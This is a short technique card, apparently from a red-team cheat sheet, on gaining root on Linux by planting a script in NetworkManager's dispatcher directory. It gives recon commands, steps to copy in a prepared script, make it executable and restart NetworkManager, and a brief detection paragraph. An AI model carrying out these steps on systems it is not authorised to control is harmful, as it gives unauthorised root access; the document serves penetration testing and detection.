---
technique: Network Script Abuse
category: privilege-escalation
targets: Linux Network Scripts
protocols: Local
remote_capable: false
tags: linux privilege-escalation network-scripts networkmanager dispatcher
---

# Network Script Abuse

Network script abuse targets writable network configuration and dispatcher scripts that are sourced or executed by privileged network management services.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Writable network script | Operator must write a sourced config or dispatcher script |
| Privileged network manager | NetworkManager or legacy scripts must process the file as root |
| Trigger | Interface events or service restarts trigger execution |

## Linux

### List network scripts

#sh #network #recon

List Red Hat-family network script files.

```sh title:"List network scripts"
ls -la /etc/sysconfig/network-scripts
```
<!-- cheat -->

### List dispatcher scripts

#sh #networkmanager #recon

List NetworkManager dispatcher scripts.

```sh title:"List NetworkManager dispatcher scripts"
ls -la /etc/NetworkManager/dispatcher.d
```
<!-- cheat -->

### Check script permissions

#sh #network #filesystem

Check permissions on a candidate network script.

```sh title:"Check network script permissions"
ls -la "$script_path"
```
<!-- cheat
var script_path
-->

### Step 1: Install dispatcher script

#sh #networkmanager #file-write

Copy a prepared dispatcher script into NetworkManager's dispatcher directory.

```sh title:"Install dispatcher script"
cp "$script_path" "/etc/NetworkManager/dispatcher.d/$script_name"
```
<!-- cheat
var script_path
var script_name
-->

### Step 2: Make dispatcher script executable

#sh #networkmanager #file-write

Make the dispatcher script executable.

```sh title:"Make dispatcher script executable"
chmod 755 "/etc/NetworkManager/dispatcher.d/$script_name"
```
<!-- cheat
var script_name
-->

### Step 3: Restart NetworkManager

#sh #networkmanager

Restart NetworkManager to trigger dispatcher processing.

```sh title:"Restart NetworkManager"
systemctl restart NetworkManager
```
<!-- cheat -->

## Detection

Monitor writes to network script and dispatcher directories, NetworkManager restarts, and dispatcher scripts spawning shells or interpreters.
